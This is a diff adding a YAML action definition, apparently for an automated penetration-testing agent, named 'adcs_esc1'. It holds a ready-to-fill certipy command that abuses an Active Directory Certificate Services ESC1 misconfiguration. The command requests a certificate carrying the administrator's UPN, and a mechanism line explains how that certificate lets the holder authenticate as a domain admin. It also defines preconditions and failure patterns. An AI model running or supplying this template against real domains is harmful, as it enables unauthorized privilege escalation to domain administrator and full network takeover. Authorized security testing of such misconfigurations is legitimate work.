@@ -1,0 +1,17 @@
+name: adcs_esc1
+category: ad
+description: ADCS ESC1 exploitation
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "certipy req -u '{username}@{domain}' -p '{password}' -ca '{ca}' -template '{template}' -upn 'administrator@{domain}' -dc-ip {target_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "ESC1: Template allows enrollee-supplied SAN + any authenticated user can enroll + EKU allows client auth. Request cert with DA SAN → auth as DA."
